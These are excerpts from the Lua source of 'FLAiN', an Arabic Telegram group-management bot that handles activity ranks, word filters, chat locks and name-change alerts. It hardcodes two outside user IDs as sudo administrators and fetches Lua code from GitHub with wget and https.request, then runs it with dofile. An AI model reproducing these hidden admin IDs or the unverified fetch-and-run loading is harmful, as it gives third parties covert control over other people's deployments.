...
while(true) do
rm -fr ../.telegram-cli
screen -S FLAiN -X kill
screen -S FLAiN ./FLAiN
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/TEAM-FLAiN/Files_FLAiN/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,160255386,1013986360}   
...
if tonumber(user_id) == tonumber(160255386) then  
var = true  
elseif tonumber(user_id) == tonumber(1013986360) then
var = true  
...
local UserName = (data.username_ or "xxxx8x")
...
local FLAiN_Msg = ''  
if msgs < 100 then 
FLAiN_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
FLAiN_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
FLAiN_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
FLAiN_Msg = 'متفاعل' 
elseif msgs < 1200 then 
FLAiN_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
FLAiN_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
FLAiN_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
FLAiN_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
FLAiN_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
FLAiN_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
FLAiN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
FLAiN_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
FLAiN_Msg = 'رب التفاعل'  
end 
return FLAiN_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"📡┇CH : @xxxx8x")  
...
function plugin_FLAiN(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.FLAiN and msg then
pre_msg = plugin.FLAiN(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceFLAiN(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,FLAiN_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,' ❅┇ تم تحديث السورس \n ❅┇ لديك اخر اصدار لسورس فلاين\n ❅┇ الاصدار » [ 2.0 ]')
dofile('FLAiN.lua')  
end
if text == 'الاصدار ❅' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❅┇ اصدار سورس فلاين \n ❅┇الاصدار » [ v 2.0 ]')
end
...
send(msg.chat_id_, msg.id_,'❅┇  عدد الكروبات الان » { '..#group..' }'..FLAiNk..''..FLAiN..'\n❅┇  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ❅┇ العضو » ['..result.title_..'](t.me/'..(username or 'xxxx8x')..')'
status  = '\n ❅┇ تم ترقيته مطور'
...
usertext = '\n ❅┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxx8x')..')'
status  = '\n ❅┇ تم ترقيته مطور'
...
local FLAiN1_Msg = database:get(bot_id.."FLAiN1:Add:Filter:Rp2"..text..msg.chat_id_)   
if FLAiN1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❅┇ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'xxxx8x')..') \n ❅┇ '..FLAiN1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if FLAiN_Msg and not Special(msg) then  
local FLAiN_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if FLAiN_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❅┇ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❅┇ ["..FLAiN_Msg.."] \n")
else
send(msg.chat_id_,0," ❅┇ العضو : {["..data.first_name_.."](T.ME/xxxx8x)}\n ❅┇ ["..FLAiN_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❅┇ عذرا » {["..data.first_name_.."](T.ME/xxxx8x)}\n ❅┇ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."FLAiN:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."FLAiN:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."FLAiN:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."FLAiN:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."FLAiN:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."FLAiN:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."FLAiN:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."FLAiN:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."FLAiN:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."FLAiN:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."FLAiN:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."FLAiN:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."FLAiN:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "❅┇ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "xxxx8x")..")\n❅┇ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."FLAiN:teh"..msg.chat_id_).."} بجانب اسمك\n❅┇ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local FLAiNChengName = database:get(bot_id.."FLAiN:Cheng:Name"..data.id_)
if not data.first_name_ then 
if FLAiNChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..FLAiNChengName..']')
database:del(bot_id.."FLAiN:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if FLAiNChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."FLAiN:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local FLAiNChengUserName = database:get(bot_id.."FLAiN:Cheng:UserName"..data.id_)
if not data.username_ then 
if FLAiNChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..FLAiNChengUserName..']')
database:del(bot_id.."FLAiN:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if FLAiNChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."FLAiN:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local FLAiNChengPhoto = database:get(bot_id.."FLAiN:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if FLAiNChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."FLAiN:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if FLAiNChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."FLAiN:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
❅ ⦑ SOURCE FLAiN ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
❅┇ [Source Channel](t.me/XxXx8X)

❅┇ [Source Update ](t.me/sourceflain)     

❅┇ [Source developer](t.me/vXvvv)     

❅┇ [Tumbelr Source](t.me/oo9oo) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS FLAiN](t.me/wxBoT)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ❅┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'xxxx8x')..') \n ❅┇ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❅┇ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxx8x')..') \n ❅┇ تـم قفـل التاك بالكتم ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TEAM-FLAiN/FLAiNFiLe/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❅┇ اهلا بك في متجر ملفات فلاين\n ❅┇ ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉\n ❅┇ علامة تعني { ✔️ } ملف مفعل\n ❅┇ علامة تعني { ✖ } ملف معطل\n ❅┇ قناة سورس فلاين ↓\n".." ❅┇ [اضغط هنا لدخول](t.me/xxxx8x) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/TEAM-FLAiN/FLAiNFiLe/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('FLAiN.lua')  
else
send(msg.chat_id_, msg.id_," ❅┇ عذرا الملف لايدعم سورس فلاين \n") 
end
return false
end
...
local UserName = (b.username_ or "TEAM-FLAiN")
...
function Function_FLAiN(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_FLAiN, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_FLAiN, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❅┇ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxx8x')..')'
status  = '\n ❅┇ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ❅┇ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❅┇ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxx8x')..')'
...
database:set(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ❅┇ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."FLAiN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."FLAiN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ❅┇ تم منع الكلمه مع التحذير")  
database:del(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."FLAiN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."FLAiN1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."FLAiN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ❅┇ ارسل الكلمه الان")  
database:set(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FLAiN1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."FLAiN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."FLAiN1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."FLAiN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FLAiN1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."FLAiN1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ❅┇ قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do  
local FLAiN_Msg = database:get(bot_id.."FLAiN1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..FLAiN_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ❅┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'xxxx8x')..')'..'\n ❅┇ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلاين').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فلاين')
local FLAiN_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..FLAiN_Msg[math.random(#FLAiN_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ❅┇ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:FLAiN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:FLAiN:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:FLAiN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"❅┇ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:FLAiN:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:FLAiN:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:FLAiN:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:FLAiN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:FLAiN:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:FLAiN:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:FLAiN:List:Rd:Sudo")
end
...
database:set(bot_id.."xxxx8x:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."xxxx8x:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."xxxx8x:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."xxxx8x:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"❅┇تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."xxxx8x:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."xxxx8x:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس فلاين يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:FLAiN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"❅┇ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:FLAiN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:FLAiN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:FLAiN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:FLAiN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"❅┇تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:FLAiN:Add:Rd:Sudo:Text2"..text)   
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلاين').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxx8x')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
FLAiNdx(msg.chat_id_, msg.id_, ' ❅┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n ❅┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ❅┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ❅┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == "بوت الانستا" or text == "اريد لستوري" or text == "يوتيوب" or text == "انستا" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"❅┇بوت تحميل من مواقع تواصل : @ziqlbot"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
local notText = 'هذه الامر لا يخصك عزيزي ⚠️'
...
{
{text = 'القائمة الاساسية ', callback_data="/help"},
},
...
{
{text = 'القائمة الاساسية ', callback_data="/add"},
},
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فلاين')
...
FLAiN = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(FLAiN)
...
--------------------------------------------------------------------------------------------------------------
SourceFLAiN(data.message_,data)
plugin_FLAiN(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local FLAiNAbot = database:get(bot_id.."FLAiN1:Add:Filter:Rp2"..text..result.chat_id_)   
if FLAiNAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ❅┇ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❅┇ ["..FLAiNAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local FLAiN1_Msg = database:get(bot_id.."FLAiN1:Add:Filter:Rp2"..text..result.chat_id_)   
if FLAiN1_Msg then    
send(msg.chat_id_, msg.id_," ❅┇ "..FLAiN1_Msg)
